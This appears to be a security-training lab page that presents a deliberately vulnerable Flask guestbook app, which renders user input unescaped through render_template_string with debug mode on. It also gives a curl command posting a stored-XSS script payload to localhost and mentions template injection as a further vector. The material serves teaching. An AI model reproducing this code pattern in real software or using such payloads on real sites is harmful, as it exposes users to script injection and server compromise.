<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
<head>
    <title>2.3 XSS — Python (Flask) vulnerable app</title>
    <style type="text/css" media="screen">
		@import url( ../shared/style.css );
	</style>
	<script src="../shared/scormfunctions.js" type="text/javascript"></script>
	<script src="../shared/contentfunctions.js" type="text/javascript"></script>
</head>
<body>
<h1>2.3 XSS — Python (Flask) vulnerable app</h1>

<h3><strong>Files — </strong><strong><code>vuln_xss_flask/app.py</code></strong></h3>

<p>from flask import Flask, request, render_template_string</p>

<p>app = Flask(__name__)</p>

<p>MESSAGES = []</p>

<p>@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</p>

<p>def index():</p>

<p>    if request.method == &#x27;POST&#x27;:</p>

<p>        name = request.form.get(&#x27;name&#x27;, &#x27;&#x27;)</p>

<p>        message = request.form.get(&#x27;message&#x27;, &#x27;&#x27;)</p>

<p>        MESSAGES.append({&#x27;name&#x27;: name, &#x27;message&#x27;: message})</p>

<p>    # VULNERABLE: using render_template_string with unescaped content</p>

<p>    html = &quot;&lt;h1&gt;Messages&lt;/h1&gt;&lt;form method=&#x27;post&#x27;&gt;Name: &lt;input name=&#x27;name&#x27;/&gt;&lt;br/&gt;Message: &lt;input name=&#x27;message&#x27;/&gt;&lt;input type=&#x27;submit&#x27;/&gt;&lt;/form&gt;&lt;ul&gt;&quot;</p>

<p>    for m in MESSAGES:</p>

<p>        html += f&quot;&lt;li&gt;&lt;b&gt;{m[&#x27;name&#x27;]}&lt;/b&gt;: {m[&#x27;message&#x27;]}&lt;/li&gt;&quot;</p>

<p>    html += &quot;&lt;/ul&gt;&quot;</p>

<p>    return render_template_string(html)</p>

<p>if __name__ == &#x27;__main__&#x27;:</p>

<p>    app.run(debug=True, host=&#x27;0.0.0.0&#x27;, port=5001)</p>

<h3><strong>Run &amp; exploit</strong></h3>

<div class="code-block">
<pre><code>pip install Flask
python app.py</code></pre>
</div>

<ol>
    <li>In browser or curl, post payload:
</li>
</ol>

<p>curl -X POST -d &quot;name=attacker&amp;message=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot; http://localhost:5001/</p>

<p>Then load <code>http://localhost:5001/</code> in browser — alert executes.</p>

<p><strong>Errors &amp; fixes</strong></p>

<ul>
    <li><code>TemplateSyntaxError</code> if payload contains Jinja delimiters — Flask will try to render; this is an additional attack vector.
</li>
</ul>

<script type="text/javascript">
</script>
</body>
</html>